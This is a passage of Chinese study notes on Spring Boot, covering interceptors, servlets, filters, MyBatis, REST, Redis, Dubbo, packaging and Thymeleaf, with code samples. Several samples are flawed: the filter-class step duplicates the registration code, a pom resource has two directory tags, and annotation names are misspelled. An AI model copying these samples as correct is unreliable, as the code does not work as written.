src/main/webappspring.mvc.view.prefix=/spring.mvc.view.suffix=.jsp\npom.xml文件中，指定jsp编译后存放的目录。\n&lt;resources&gt;    &lt;resource&gt;        &lt;!--jsp原来的目录--&gt;        &lt;directory&gt;src/main/webapp&lt;/directory&gt;        &lt;!--指定编译后的存放目录--&gt;        &lt;directory&gt;META_INF/resources&lt;/directory&gt;        &lt;!--指定处理的目录和文件--&gt;        &lt;includes&gt;            &lt;include&gt;**/*.*&lt;/include&gt;        &lt;/includes&gt;    &lt;/resource&gt;&lt;/resources&gt;\n\njsp正在被逐渐淘汰，因为它在页面中嵌入了java代码。使得前后端不能分离，从而加大了前端与后端的沟通成本，降低了开发效率。比如下面的对话(来自网络)\n\n后端：你写的页面有问题啊，不显示数据。前端：不可能，我这边都是好的。后端：你自己来看啊。前端：你写的这是什么玩意？我给你的代码不是这样的。后端：我得把你的代码加到 JSP 里啊。前端：我又不懂 JSP 啊，你再把代码摘出来吧，我帮你看看问题。后端：……\n\n可以使用ajax技术，实现前后端分离。\n使用容器通过代码，从容器中获取对象。在main方法中SpringApplication.run()方法获取返回的String容器对象，再获取业务bean进行调用。\nrun()方法的源码：\npublic static ConfigurableApplicationContext run(Class&lt;?&gt; primarySource, String... args) &#123;    return run(new Class[]&#123;primarySource&#125;, args);&#125;\nConfigurableApplicationContext：接口，是ApplicationContext的子接口\n使用示例：手动从容器中获取UserService对象，调用其中的sayHello方法。\n@SpringBootApplicationpublic class SpringBootDemo001Application &#123;    public static void main(String[] args) &#123;        //获取容器对象        //ConfigurableApplicationContext ctx = SpringApplication.run(SpringBootDemo001Application.class, args);        ApplicationContext ctx = SpringApplication.run(SpringBootDemo001Application.class, args);        //从容器中获取对象        UserService userService = (UserService) ctx.getBean(&quot;UserService&quot;);        userService.sayHello(&quot;张三&quot;);    &#125;&#125;\n\nCommandLineRunner接口、ApplicationRunner接口这两个接口都有一个run方法。执行时间在容器对象创建好后，自动执行run()方法。可以完成自定义的在容器对象创建好的一些操作。\n源码：\n@FunctionalInterfacepublic interface CommandLineRunner &#123;    void run(String... args) throws Exception;&#125;@FunctionalInterfacepublic interface ApplicationRunner &#123;    void run(ApplicationArguments args) throws Exception;&#125;\n\n他们在容器启动完成后执行。我们只需要实现这个方法，就可以在容器启动后执行一些内容。比如读取配置文件，数据库连接之类。\n使用示例：\npublic class AfterRun implements CommandLineRunner &#123;    @Override    public void run(String... args) throws Exception &#123;        //可做自定义操作        System.out.println(&quot;在容器对象创建好，执行的方法&quot;);    &#125;&#125;\n\n第三章 Web组件拦截器、servlet、Filter\n拦截器拦截器是SpringMVC中的一种对象，能拦截对Controller的请求。拦截器框架中由系统的拦截器，可以自定义拦截器。实现对请求的预先处理。\nSpringMVC实现自定义拦截器：\n\n创建类实现SpringMVC框架的HandlerInterceptor接口public interface HandlerInterceptor &#123;    default boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;        return true;    &#125;    default void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable ModelAndView modelAndView) throws Exception &#123;    &#125;    default void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable Exception ex) throws Exception &#123;    &#125;&#125;\n需在SpringMVC的配置文件中，声明拦截器&lt;mvc:interceptors&gt;    &lt;mvc:interceptor&gt;        &lt;mvc:mapping path=&quot;url&quot;/&gt;        &lt;bean class=&quot;拦截器的全限定名称&quot;/&gt;    &lt;/mvc:interceptor&gt;&lt;/mvc:interceptors&gt;\n\nSpringBoot实现拦截器：\n\n自定义拦截器package com.example.web;import org.springframework.web.servlet.HandlerInterceptor;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;/** * 自定义的拦截器 */public class LoginInterceptor implements HandlerInterceptor &#123;    /**     * @param request     * @param response     * @param handler  被拦截的控制器对象     * @return boolean     * true：请求被Controller处理     * false：请求被拦截     */    @Override    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;        //判断是否通过拦截器的代码        System.out.println(&quot;拦截器被执行&quot;);        return true;    &#125;&#125;\n将拦截器对象注入容器package com.example.config;import com.example.web.LoginInterceptor;import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.HandlerInterceptor;import org.springframework.web.servlet.config.annotation.InterceptorRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;@Configurationpublic class HandlerInterceptorConfig implements WebMvcConfigurer &#123;    //添加拦截器对象，注入到容器中    @Override    public void addInterceptors(InterceptorRegistry registry) &#123;        //创建拦截器对象        HandlerInterceptor interceptor = new LoginInterceptor();        //指定拦截的url请求        String path[] = &#123;&quot;/user/**&quot;&#125;;        //指定不拦截的地址        String excludePath[] = &#123;&quot;/user/login&quot;&#125;;        registry.addInterceptor(interceptor).addPathPatterns(path).excludePathPatterns(excludePath);    &#125;&#125;\n写Controller类进行测试package com.example.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.ResponseBody;@Controllerpublic class HandlerInterceptorController &#123;    @RequestMapping(&quot;/user/register&quot;)    @ResponseBody    public String userRegister()&#123;        return &quot;访问/user/register&quot;;    &#125;    @RequestMapping(&quot;/user/login&quot;)    @ResponseBody    public String userLogin()&#123;        return &quot;访问/user/login&quot;;    &#125;&#125;\n\nServlet在SpringBoot中使用Servlet对象使用步骤：\n\n创建Servlet类。创建类继承HttpServlet。package com.example.web;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;//创建Servlet类public class Servlet extends HttpServlet &#123;    @Override    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;        doPost(req, resp);    &#125;    @Override    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;        //使用HttpServletResponse输出数据，应答结果        resp.setContentType(&quot;text/html;charset=utf-8&quot;);        PrintWriter out = resp.getWriter();        out.println(&quot;执行servlet&quot;);        out.flush();        out.close();    &#125;&#125;\n注册Servlet，让框架能找到Servlet。package com.example.config;import com.example.web.Servlet;import org.springframework.boot.web.servlet.ServletRegistrationBean;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;@Configurationpublic class ServletConfig &#123;    //定义方法，注册Servlet对象    @Bean    public ServletRegistrationBean servletRegistrationBean()&#123;        //public ServletRegistrationBean(T servlet, String... urlMappings)        //第一个参数是Servlet对象，第二个参数是url地址        //ServletRegistrationBean bean = new ServletRegistrationBean(new Servlet(),&quot;/servlet&quot;);        //无参构造，单独设置参数        ServletRegistrationBean bean = new ServletRegistrationBean();        bean.setServlet(new Servlet());        bean.addUrlMappings(&quot;/servlet_01&quot;,&quot;/servlet_02&quot;); // &lt;url-pattern&gt;        return bean;    &#125;&#125;\n\nFilter过滤器Filter是Servlet规范中的过滤器，可以处理请求，对请求的参数、属性进行调整。常常在过滤器中处理字符编码使用步骤：\n\n创建自定义的过滤器类package com.example.config;import com.example.web.MyFilter;import org.springframework.boot.web.servlet.FilterRegistrationBean;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;@Configurationpublic class FilterConfig &#123;    @Bean    public FilterRegistrationBean filterRegistration() &#123;        FilterRegistrationBean bean = new FilterRegistrationBean();        bean.setFilter(new MyFilter());        bean.addUrlPatterns(&quot;/user/*&quot;);        return bean;    &#125;&#125;\n注册Filter过滤器对象package com.example.config;import com.example.web.MyFilter;import org.springframework.boot.web.servlet.FilterRegistrationBean;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;@Configurationpublic class FilterConfig &#123;    @Bean    public FilterRegistrationBean filterRegistration() &#123;        FilterRegistrationBean bean = new FilterRegistrationBean();        bean.setFilter(new MyFilter());        bean.addUrlPatterns(&quot;/user/*&quot;);        return bean;    &#125;&#125;\n写Controller类进行测试package com.example.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.ResponseBody;@Controllerpublic class HandlerInterceptorController &#123;    @RequestMapping(&quot;/user/register&quot;)    @ResponseBody    public String userRegister()&#123;        return &quot;访问/user/register&quot;;    &#125;    @RequestMapping(&quot;/user/login&quot;)    @ResponseBody    public String userLogin()&#123;        return &quot;访问/user/login&quot;;    &#125;    @RequestMapping(&quot;/query&quot;)    @ResponseBody    public String query()&#123;        return &quot;访问/query&quot;;    &#125;&#125;\n\n字符集过滤器CharacterEncodingFilter：解决post请求中乱码的问题在SpringMVC框架，在web.xml中注册过滤器。配置它的属性\n\n使用系统提供的字符集过滤器类过滤器的注册package com.example.config;import org.springframework.boot.web.servlet.FilterRegistrationBean;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.web.filter.CharacterEncodingFilter;@Configurationpublic class FilterConfig &#123;    @Bean    public FilterRegistrationBean filterRegistration() &#123;        FilterRegistrationBean bean = new FilterRegistrationBean();        //使用框架中的过滤器类        CharacterEncodingFilter filter = new CharacterEncodingFilter();        //指定使用的编码方式        filter.setEncoding(&quot;utf-8&quot;);        //指定request，response都使用encoding的值        filter.setForceEncoding(true);        bean.setFilter(filter);        //指定过滤的url地址        bean.addUrlPatterns(&quot;/*&quot;);        return bean;    &#125;&#125;\n同时需要关闭SpringBoot中默认配置的字符集过滤器，使自定义的过滤器起作用。#SpringBoot中默认已经配置了Character Encoding Filter，默认编码ISO-8859-1#设置enable=false 作用是关闭系统中配置好的过滤器，使用自定义的CharacterEncodingFilterserver.servlet.encoding.enabled=false\n直接修改application.properties配置#让系统的CharacterEncodingFilter生效server.servlet.encoding.enabled=true#指定使用的编码方式server.servlet.encoding.charset=UTF-8#强制request、response都使用charset属性的值server.servlet.encoding.force=true\n\n第四章 ORM操作MySQLORM是“对象-关系-映射”的简称。（Object Relational Mapping，简称ORM）orm其实就是将类对象的语法翻译成sql语句的一个引擎\n使用MyBatis框架操作数据库，在SpringBoot框架集成MyBatis使用步骤：\n\nmybatis起步依赖：完成mybatis对象自动配置，对象放在容器中。\npom.xml指定把src&#x2F;main&#x2F;java目录中的xml文件包含到classpath中。\n创建实体类Student。\n创建Dao接口StudentDao，创建一个查询学生的方法。\n穿啊关键Dao接口对应的Mapper文件，xml文件，写sql语句。\n创建Service层对象，创建StudentService接口和他的实现类。调dao对象的方法，完成数据库的操作。\n创建Controller对象，访问Service。\n写application.properties文件配置数据库的连接信息\n\n第一种方式：@Mapper@Mapper：放在dao接口上，每个接口都需要使用这个注解。\n/** * @Mapper： 告诉MyBatis这是dao接口，创建此接口的代理对象 *      位置：在类上 */@Mapperpublic interface StudentDao &#123;    Student selectById(@Param(&quot;stuId&quot;) Integer id);&#125;\n\n第二种方式：@MapperScan@MapperScan：放在SpringBoot启动类上，在包下所有接口在编译后会生成相应的实现类。\n@SpringBootApplication/** * @MapperScan：找到Dao接口和Mapper文件 *      basePackages：Dao接口所在的包名 */@MapperScan(basePackages = &#123;&quot;com.example.dao&quot;&#125;)public class SpringBootDemo001Application implements CommandLineRunner &#123;    //..&#125;\n\n第三种方式：Mapper文件和Dao接口分开管理将mapper文件放在resources目录下\n\n在resources目录中创建子目录（自定义），例如mapper\n将mapper文件放在mapper目录\n在application文件中指定mapper文件的目录#指定mapper文件的位置mybatis.mapper-locations=classpath:mapper/*.xml#指定mybatis的日志mybatis.configuration.log-impl=org.apache.ibatis.logging.stdout.StdOutImpl\n在pom文件中指定resources目录中的文件，编译到目标目录中&lt;!--resources插件--&gt;&lt;resources&gt;    &lt;resource&gt;        &lt;directory&gt;src/main/resources&lt;/directory&gt;        &lt;includes&gt;            &lt;include&gt;**/*.*&lt;/include&gt;        &lt;/includes&gt;    &lt;/resource&gt;&lt;/resources&gt;\n\n事务Spring框架中的事务：\n\n管理事务的对象：事务管理器（接口，接口有很多实现类） 例如：使用jdbc或mybatis访问数据库，使用的事务管理器：DataSourceTransactionManager\n声明式事务：在xml配置文件或使用注释说明事务控制的内容 控制事务：隔离级别，传播行为，超时时间\n事务处理方式：\nspring框架中的@Transactional\naspectj框架可以在xml配置文件中，声明事务控制的内容\n\n\n\nSpringBoot中使用事务：\n\n在业务方法上加入@Transactional，加入注解后，方法有事务功能。\n明确的在启动类上，加入@EnableTransactionManager\n\n第五章 接口的架构风格——RESTfulAPI百度百科接口：应用程序接口（英语：Application Programming Interface，简称：API），又称为应用编程接口，就是软件系统不同组成部分衔接的约定。由于近年来软件的规模日益庞大，常常需要把复杂的系统划分成小的组成部分，编程接口的设计十分重要。程序设计的实践中，编程接口的设计首先要使软件系统的职责得到合理划分。良好的接口设计可以降低系统各部分的相互依赖，提高组成单元的内聚性，降低组成单元间的耦合程度，从而提高系统的维护性和扩展性。接口：可以指访问servlet、controller的url，调用其他程序的 函数\n架构风格：api的组织样式    就是一个传统的：http://localhost:8080/dev/student/query?id=2\nRESTRESTful架构风格\n\nREST：(Representational State Transfer)表现层状态转移 是一种接口的架构风格和设计的理念，不是标准。 优点：更简洁，更有层次。 表现层状态转移： 表现层就是视图层，显示资源的。通过视图页面、jsp等显示操作资源的结果。 状态：资源变化 转移：资源是可以变化的。资源能创建，new状态，资源创建后可以查询资源，可以被修改。\nRESt中的要素： 用RESt表示资源和对应资源的操作。在互联网中，表示一个资源或者一个操作。 资源是用url表示的，在互联网中，使用的图片、视频、文本、网页等都是资源。 对于资源：\n查询资源：通过url找到资源\n创建资源：添加资源\n更新资源：更新资源，编辑\n删除资源：删除 资源使用url表示，通过名称表示资源  在url中，使用名词表示资源，以及访问资源的信息，在url中，使用”&#x2F;“分割对资源的信息 使用http中的动作（请求方式），表示对资源的操作（CURD）\n\n\nGET：查询资源——sql select处理单个资源：http://localhost:8080/dev/student/query/2处理多个资源：http://localhost:8080/dev/student/query/2/3\nPOST：创建资源——sql inserthttp://localhost:8080/dev/student/add在post请求中传递数据\nPUT：更新资源——sql updatehttp://localhost:8080/dev/student/query/2在post中传递数据\nDELETE：删除资源——sql deletehttp://localhost:8080/dev/student/query/2 需要分页、排序等参数，依然可以加在url后，比如： http://localhost:8080/dev/student/query/2?page=2&amp;pageSize=10\n\n\nREST即使用url表示资源，使用http动作操作资源。\n\nRESTful的注解\n@PathVariable：从url中获取数据\n@GetMapping：支持get请求方式，等同于@RequestMapping（method&#x3D;RequestMethod.GET）\n@PostMapping：支持post请求方式，等同于@RequestMapping（method&#x3D;RequestMethod.POST）\n@PutMapping：支持put请求方式，等同于@RequestMapping（method&#x3D;RequestMethod.PUT）\n@DeleteMapping：支持delete请求方式，等同于@RequestMapping（method&#x3D;RequestMethod.DELETE）\n@RestController：复合注解，是@Controller和@ResponseBody组合 在类上使用，表示当前类的所有方法都加入了@ResponseBody\n\nPostman：测试工具可以用来测试get、post、put、delete等请求。\n注意：url请求地址加请求方式 得是唯一的，否则会有歧义@GetMapping(“&#x2F;student&#x2F;{stuId}“)\n在页面中或ajax中，支持pub、delete请求在SpringMVC中，有一个过滤器，支持post请求转为put、delete\n过滤器：org.springframework.web.filter.HiddenHttpMethodFilter作用：将请求中的post请求转为put、delete\n使用步骤：\n\napplication.properties：开启使用HiddenHttpMethodMFilter过滤器\n在请求页面中，包含_method参数，他的值是put、delete，发起这个请求使用的post方式&lt;form action=&quot;student/put&quot; method=&quot;post&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;_method&quot; value=&quot;put&quot;&gt;    &lt;input type=&quot;submit&quot; value=&quot;put请求方式&quot;&gt;&lt;/form&gt;&lt;form action=&quot;student/delete&quot; method=&quot;post&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;_method&quot; value=&quot;delete&quot;&gt;    &lt;input type=&quot;submit&quot; value=&quot;delete请求方式&quot;&gt;&lt;/form&gt;\n\n第六章 SpringBoot集成RedisRedis：一个NoSQL（not only）数据库，常用作缓存使用（cache）Redis的数据类型：string、hash、set、zset、list\nRedis是一个中间件：是一个独立的服务器。Java中著名的客户端：Jedis、lettuce、Redisson\nSpring、SpringBoot中有一个RedisTemplate（StringRedisTemplate），用于处理和redis的交互\nredis的使用导入起步依赖\n&lt;!--redis起步依赖--&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;&lt;/dependency&gt;\ndata-redis使用的是 lettuce客户端库在程序中使用RedisTemplate类的方法 操作redis数据，实际就是调用的lettuce客户端中的方法\n使用示例\npackage com.example.controller;import org.springframework.data.redis.core.RedisTemplate;import org.springframework.data.redis.core.StringRedisTemplate;import org.springframework.data.redis.core.ValueOperations;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.RestController;import javax.annotation.Resource;@RestControllerpublic class RedisController &#123;    /**     * 注入RedisTemplate     *      * RedisTemplate 泛型     * RedisTemplate&lt;String,String&gt;     * RedisTemplate&lt;Object,Object&gt;     * RedisTemplate     *      * 注意：RedisTemplate对象的名称 redisTemplate     */    @Resource    private RedisTemplate redisTemplate;    @Resource    private StringRedisTemplate stringRedisTemplate;    //添加数据到redis    @PostMapping(&quot;/redis/add&quot;)    public String addToRedis(String name, String value) &#123;        //操作Redis中的String类型的数据，先获取ValueOperations对象        ValueOperations valueOperations = redisTemplate.opsForValue();        valueOperations.set(name, value);        return &quot;向redis添加String数据&quot;;    &#125;    //从redis获取数据    @GetMapping(&quot;/redis/getKey&quot;)    public String getData(String key) &#123;        ValueOperations valueOperations = redisTemplate.opsForValue();        Object value = valueOperations.get(key);        return &quot;key:&quot; + key + &quot;value:&quot; + value;    &#125;    @PostMapping(&quot;/redis/&#123;key&#125;/&#123;value&#125;&quot;)    public String addStringKV(@PathVariable String key, @PathVariable String value) &#123;        //使用StringRedisTemplate对象        stringRedisTemplate.opsForValue().set(key, value);        return &quot;使用StringRedisTemplate对象，&quot; + &quot;key:&quot; + key + &quot;value:&quot; + value;    &#125;    @PostMapping(&quot;/redis/getstr/&#123;key&#125;&quot;)    public String getStringValue(@PathVariable String key) &#123;        //使用StringRedisTemplate对象        stringRedisTemplate.opsForValue().get(key);        return &quot;使用StringRedisTemplate对象，&quot; + &quot;key:&quot; + key;    &#125;&#125;\n\nStringRedisTemplate 和 RedisTemplateStringRedisTemplate：把key、value都作为String处理，使用的是String的序列化，可读性好。RedisTemplate：把key、value经过了序列化存到redis。key、value是序列化的内容，不能直接识别。默认使用jdk的序列化，可以修改为其他的序列化。\n设置key或value的序列化方式\n/** * 设置 RedisTemplate 序列化 */public String addString(String key,String value)&#123;    //使用RedisTemplate，在存取值之前，设置序列化方式。    //设置key使用String的序列化    redisTemplate.setKeySerializer(new StringRedisSerializer());    //设置value的序列化    redisTemplate.setValueSerializer(new StringRedisSerializer());    redisTemplate.opsForValue().set(key,value);    return &quot;定义RedisTemplate对象key、value的序列化&quot;;&#125;\n\n第七章 SpringBoot集成DubboSpringBoot集成Dubbo的文档文档\n公共项目独立的maven项目：定义了接口和数据类\npublic class Student implements Serializable&#123;    private static final long serialVersionUID = 3941539077791951521L;        private Integer id;    private String name;    private Integer age;&#125;\npublic interface StudentService&#123;    Student queryStudent(Integer id);&#125;\n\n\n创建服务提供者模块，实现接口模块\n\ndubbo依赖 和 zookeeper依赖\n&lt;!--dubbo依赖--&gt;&lt;dependency&gt;    &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;    &lt;artifactId&gt;dubbo-spring-boot-starter&lt;/artifactId&gt;    &lt;version&gt;3.0.7&lt;/version&gt;&lt;/dependency&gt;&lt;!--zookeeper依赖--&gt;&lt;dependency&gt;    &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;    &lt;artifactId&gt;dubbo-dependencies-zookeeper&lt;/artifactId&gt;    &lt;version&gt;3.0.7&lt;/version&gt;    &lt;type&gt;pom&lt;/type&gt;    &lt;exclusions&gt;        &lt;!--排除log4h依赖，因为重复--&gt;        &lt;exclusion&gt;            &lt;groupId&gt;slf4j-log4j12&lt;/groupId&gt;            &lt;artifactId&gt;org.slf4j&lt;/artifactId&gt;        &lt;/exclusion&gt;    &lt;/exclusions&gt;&lt;/dependency&gt;\n注：在pom文件中使用  标签排除包含的依赖，已解决重复引入依赖的问题\n实现接口\n/*使用dubbo中的注解暴露服务@Component可以不加 */@DubboService(interfaceClass = StudentService.class,version = &quot;1.0&quot;,timeout = 5000)public class StudentServiceImpl implements StudentService &#123;    @Override    public Student queryStudent(Integer id) &#123;        Student student = studentDao.selectById(id);        return student;    &#125;&#125;\n\n外部化配置\n#配置服务名称 dubbo:application name=&quot;名称&quot;spring.application.name=studentService-provider#配置扫描的包，扫描的@DubboServicedubbo.scan.base-packages=com.example.service#配置dubbo协议#dubbo.protocol.name=dubbo#dubbo.protocol.port=20881#注册中心dubbo.registry.address=zookeeper://localhost:2181\n\n在类上使用 @DubboService 注解来暴露服务\n在主类之上使用 @EnableDubbo 注解启用Dubbo包含了 @EnableDubboConfig 和 @DubboComponentScan\n@SpringBootApplication@EnableDubbopublic class SpringBootDemo001Application&#123;    public static void main(String[] args) &#123;        SpringApplication.run(SpringBootDemo001Application.class, args);    &#125;&#125;\n\n\n创建消费者模块\n\n添加依赖，与服务提供者相同。\n创建Controller或者Service调用远程服务\n@RestContrlollerpublic class DubboController&#123;    /*            引用远程服务，把创建好的代理对象，注入给studentService            @DubboReference(interfaceClass = StudentService.class,version = &quot;1.0&quot;)            没有使用interfaceClass，默认是 引用数据类型     */    @DubboReference(version = &quot;1.0&quot;)    private StudentService studentService;        @GetMapping(&quot;/query&quot;)    public String queryStudent(Integer id)&#123;        Student student = studentService.queryStudent(id);        return &quot;调用远程接口获取的对象：&quot;+student;    &#125;&#125;\n\n配置文件application.properties\n#指定服务名称spring.application.name=consumer-application#指定注册中心dubbo.registry.address=zookeeper://localhost:2181\n\n第八章 SpringBoot打包主类继承SpringBootServletInitializer才能使用外部的tomcatSpringBootServletInitializer相当于原有web.xml的替代使用嵌入式的tomcat，默认不支持jsp。  \n打包成war\n指定打包后的名称&lt;build&gt;    &lt;!--打包后的文件名称--&gt;    &lt;finalName&gt;bootDemo&lt;/finalName&gt;&lt;/build&gt;\n指定jsp编译的目录&lt;resources&gt;    &lt;resource&gt;        &lt;directory&gt;src/main/java&lt;/directory&gt;        &lt;includes&gt;            &lt;include&gt;**/*.xml&lt;/include&gt;        &lt;/includes&gt;    &lt;/resource&gt;    &lt;resource&gt;        &lt;directory&gt;src/main/resources&lt;/directory&gt;        &lt;includes&gt;            &lt;include&gt;**/*.*&lt;/include&gt;        &lt;/includes&gt;    &lt;/resource&gt;    &lt;resource&gt;        &lt;directory&gt;src/main/webapp&lt;/directory&gt;        &lt;targetPath&gt;META-INF/resources&lt;/targetPath&gt;        &lt;includes&gt;            &lt;include&gt;**/*.*&lt;/include&gt;        &lt;/includes&gt;    &lt;/resource&gt;&lt;/resources&gt;\n执行打包是war&lt;!--打包类型--&gt;&lt;packaging&gt;war&lt;/packaging&gt;\n主启动类继承SpringBootServletInitializer@SpringBootApplicationpublic class SpringBootDemo001Application extends SpringBootServletInitializer&#123;    public static void main(String[] args) &#123;        SpringApplication.run(SpringBootDemo001Application.class, args);    &#125;&#125;\n部署war将war文件放到tomcat等服务器的发布目录中。\n\n打包成jar\n指定打包后的名称&lt;build&gt;    &lt;!--打包后的文件名称--&gt;    &lt;finalName&gt;bootDemo&lt;/finalName&gt;&lt;/build&gt;\n指定springboot-maven-plugin版本&lt;plugins&gt;    &lt;plugin&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;        &lt;!--打包jar，有jsp文件时，必须指定maven-plugin插件版本是1.4.2.RELEASE--&gt;        &lt;version&gt;1.4.2.RELEASE&lt;/version&gt;    &lt;/plugin&gt;&lt;/plugins&gt;\n执行maven clean package 在target目录中，生成jar文件 bootDemo.jar 执行独立的springboot项目，即 java -jar bootDemo.jar\n\n第九章 Thymeleaf 模板介绍Thymeleaf是模板引擎，使用Java开发，在服务器端运行。将处理好的请求发送给浏览器。Java生态下的模板还有Freemaker、Velocity、Beetl(国产)等。非web环境下，Thymeleaf能直接显示模板上的静态数据；web环境下，能像jsp一样从后台接收数据并替换到模板上。它是基于HTML的，以HTML标签为载体。SpringBoot集成了Thymeleaf模板技术，官方也推荐使用它来代替jsp进行前端页面的数据展示。因为jsp需要编译运行，效率比较低。\nThymeleaf官网Thymeleaf官方文档\n配置依赖\n&lt;!--模板引擎起步依赖--&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;&lt;/dependency&gt;\n\n一些配置\n#在开发阶段，关闭模板缓存，让修改立刻生效spring.thymeleaf.cache=false#编码格式spring.thymeleaf.encoding=UTF-8#模板的类型（默认是HTML，模板是html文件）spring.thymeleaf.mode=HTML#模板的前缀： 类路径的 classpath:/templatesspring.thymeleaf.prefix=classpath:/templates/#后缀spring.thymeleaf.suffix=.html\n\n表达式\n标准变量表达式 语法：${key} 作用：获取key对应的文本数据，key是request作用域中的key。使用request.setAttribute(),model.addAttribute() 在页面中html标签中使用 th:text&#x3D;”${key}”&lt;p&gt;获取student对象属性值&lt;/p&gt;&lt;p th:text=&quot;$&#123;student.id&#125;&quot;&gt;id&lt;/p&gt;&lt;p th:text=&quot;$&#123;student.name&#125;&quot;&gt;name&lt;/p&gt;&lt;p th:text=&quot;$&#123;student.age&#125;&quot;&gt;age&lt;/p&gt;\n选择变量表达式（星号变量表达式） 语法：*{key} 作用：获取这个key对应的数据，*{key}需要与th:object一起使用 目的是简单获取对象的属性值&lt;p&gt;使用 *&#123;&#125; 获取student对象属性值&lt;/p&gt;&lt;div th:object=&quot;$&#123;student&#125;&quot;&gt;    &lt;p th:text=&quot;*&#123;id&#125;&quot;&gt;id&lt;/p&gt;    &lt;p th:text=&quot;*&#123;name&#125;&quot;&gt;name&lt;/p&gt;    &lt;p th:text=&quot;*&#123;age&#125;&quot;&gt;age&lt;/p&gt;&lt;/div&gt;&lt;!--直接使用也可以--&gt;&lt;p th:text=&quot;*&#123;student.id&#125;&quot;&gt;id&lt;/p&gt;\n链接表达式 语法：@{url} 作用：表示链接\n\n&lt;h3&gt;链接绝对路径&lt;/h3&gt;&lt;a th:href=&quot;@&#123;https://baidu.com&#125;&quot;&gt;百度&lt;/a&gt;&lt;h3&gt;链接相对路径&lt;/h3&gt;&lt;a th:href=&quot;@&#123;/queryStudent&#125;&quot;&gt;相对地址，没有参数&lt;/a&gt;&lt;h3&gt;链接相对路径，使用字符串链接传递参数&lt;/h3&gt;&lt;a th:href=&quot;@&#123;&#x27;/queryStudent?id=&#x27; + $&#123;student.id&#125; &#125;&quot;&gt;相对地址，有参数。获取model中的数据&lt;/a&gt;&lt;h3&gt;传递多个参数&lt;/h3&gt;&lt;a th:href=&quot;@&#123;/queryStudent(name=&#x27;zhangsan&#x27;,id=20)&#125;&quot;&gt;传多个参数&lt;/a&gt;\n\nThymeleaf属性属性是放在html元素中的，就是html元素的属性，加入了th前缀。属性的作用不变。加上th。属性的值由模板引擎处理，在属性上可以使用变量表达式。\n&lt;form action=&quot;/queryStudent&quot; method=&quot;post&quot;&gt;&lt;/form&gt;&lt;form th:action=&quot;/queryStudent&quot; th:method=&quot;$&#123;methodAttr&#125;&quot;&gt;&lt;/form&gt;g\n\neach 循环each循环，可以循环List、Map、Array语法：在html标签中使用 th:each\n&lt;div th:each=&quot;集合循环成员，循环状态变量：$&#123;key&#125;&quot;&gt;    &lt;p th:text=&quot;$&#123;集合循环成员&#125;&quot;&gt;&lt;/p&gt;&lt;/div&gt;\n\n集合循环成员，循环状态变量：名称都是自定义的。”循环的状态变量“可以不定义，默认是”集合循环成员Stat“循环状态变量 iterStat 可以获取以下信息index：当前迭代对象的indexcount：当前迭代对象个数（第几个）size：当前迭代对象大小（总数）even&#x2F;odd：布尔值，当前循环是否是偶数&#x2F;奇数（从0开始计算）first：布尔值，当前循环是否是第一个last：布尔值，当前循环是否是最后一个\n条件判断if判断语句，条件为true，显示html标签内容，否则不显示。没有else语句语法：th:if&#x3D;”条件语句”\n&lt;p th:if=&quot;$&#123;id==1001&#125;&quot;&gt;id是1001&lt;/p&gt;&lt;!--&quot;&quot;空字符是true--&gt;&lt;p th:if=&quot;$&#123;sex&#125;&quot;&gt;空字符&lt;/p&gt;&lt;!--null是false--&gt;&lt;p th:if=&quot;$&#123;null&#125;&quot;&gt;null&lt;/p&gt;\n\n还有个与 th:unless 和 th:if 相反的行为\n判断语句 switch,caseth:switch 和 java中的switch一样语法：th:switch&#x3D;”要比较的值”,th:case&#x3D;”值”\n&lt;div th:switch=&quot;要比较的值&quot;&gt;    &lt;p th:case=&quot;值1&quot;&gt;结果1&lt;/p&gt;    &lt;p th:case=&quot;值2&quot;&gt;结果2&lt;/p&gt;    &lt;p th:case=&quot;*&quot;&gt;默认结果(default)&lt;/p&gt;&lt;/div&gt;\n注：以上case只有一句执行\n内联 inline\n内联test：在html标签外，获取表达式的值 语法：[[${key}]]\n&lt;div th:inline=&quot;text&quot;&gt;    &lt;p&gt;我是[[$&#123;name&#125;]]&lt;/p&gt;&lt;/div&gt;\n\n内联JavaScript\n&lt;script type=&quot;text/javascript&quot; th:inline=&quot;javascript&quot;&gt;    var name = [[$&#123;name&#125;]]    alert(name)&lt;/script&gt;\n\n字面量\n文本字面量：使用单引号括起来的字符串&lt;p th:text=&quot;&#x27;我是&#x27;+$&#123;name&#125;&quot;&gt;数据显示&lt;/p&gt;\n数字字面量&lt;p 